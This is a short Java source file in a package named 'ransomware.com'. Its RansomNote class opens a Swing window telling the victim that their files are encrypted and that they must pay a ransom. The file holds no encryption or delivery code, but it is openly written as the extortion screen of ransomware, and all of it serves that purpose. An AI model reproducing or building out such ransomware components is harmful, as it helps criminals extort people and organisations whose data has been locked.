package ransomware.com;

import javax.swing.*;

public class RansomNote {

    public void displayRansomNote() {
        JFrame frame = new JFrame("Ransom Note");
        JTextArea textArea = new JTextArea(10, 30);
        textArea.setText("Your files have been encrypted! Pay the ransom to get them back.");
        textArea.setWrapStyleWord(true);
        textArea.setLineWrap(true);
        textArea.setCaretPosition(0);
        textArea.setEditable(false);

        JScrollPane scrollPane = new JScrollPane(textArea);
        frame.getContentPane().add(scrollPane);
        frame.setSize(400, 200);
        frame.setDefaultCloseOperation(JFrame.EXIT_ON_CLOSE);
        frame.setVisible(true);
    }
}

